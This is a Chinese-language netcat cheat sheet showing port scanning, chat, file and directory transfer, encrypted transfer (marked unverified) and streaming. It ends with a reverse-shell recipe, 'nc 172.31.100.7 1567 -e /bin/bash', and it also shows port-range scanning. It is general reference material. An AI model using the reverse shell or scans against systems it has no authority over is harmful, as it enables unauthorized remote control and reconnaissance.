# NETCAT 速查
netcat是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据。netcat所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。

## help
```
connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
listen for inbound:	nc -l -p port [-options] [hostname] [port]
options:
	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
	-e filename		program to exec after connect [dangerous!!]
	-b			allow broadcasts
	-g gateway		source-routing hop point[s], up to 8
	-G num			source-routing pointer: 4, 8, 12, ...
	-h			this cruft
	-i secs			delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
	-l			listen mode, for inbound connects
	-n			numeric-only IP addresses, no DNS
	-o file			hex dump of traffic
	-p port			local port number
	-r			randomize local and remote ports
	-q secs			quit after EOF on stdin and delay of secs
	-s addr			local source address
	-T tos			set Type Of Service
	-t			answer TELNET negotiation
	-u			UDP mode
	-v			verbose [use twice to be more verbose]
	-w secs			timeout for connects and final net reads
	-C			Send CRLF as line-ending
	-z			zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').

```
## 端口扫描

```nc -z -v -n some_ip portlist -w timeout_second```

```nc -z -v -n 10.10.10.129 1-100 -w 2```

注意：
- -z 参数告诉netcat使用0 IO,连接成功后立即关闭连接， 不进行数据交换
- -n 参数告诉netcat 不要使用DNS反向查询IP地址的域名
- -w 参数限制连接尝试时间


## 聊天服务器
server端
```nc -l -p someport```

注意：
- -p只能用于指定本地端口号。
- -l表示监听

client端：
```nc -n server_ip server_port```

client上发的任何字符都会到服务器上。反向不行
## 文件传输

server：
```nc -l -p some_port < src_file```

client：
```nc -n server_ip server_port > dst_file```

server和client角色根据需要自定义。
## 目录传输

server:
```tar -cvf - dir_name |nc -l -p some_port```

client:
```nc -n server_ip server_port | tar -xvf -```

注意：
- ```-```表示标准IO

### 压缩传输

server：
```tar -cvf - dir_name | bzip2 -z |nc -l   some_port```
client:
```nc -n server_ip server_port | bzip2 -d|tar -xvf -```


### 加密传输

#### 初始化
建立密钥
```openssl genrsa -out rsa.key 2048```

提取公钥：
```openssl rsa -in rsa.key -pubout -out public.key```

#### 传送密钥
server：
```nc -l  some_port < public.key```

client：
```nc -n server_ip server_port > public.key```

#### 加密传输
（未验证）
server(接收数据)：
```nc -l   some_port  | openssl enc -d -aes256 -in - -out decrypted.txt```

client(发送数据)
```openssl enc -e -aes256 -in data |nc -n server_ip server_port  ```

## 流媒体

server
```cat video.avi |nc -l -p some_port```

client
```nc server_ip server_port | mplayer -vo x11 -cache 3000 -```

## 反向shell

server:
```$nc -l 1567```
在客户端，简单地告诉netcat在连接完成后，执行shell。

客户端
```$nc 172.31.100.7 1567 -e /bin/bash```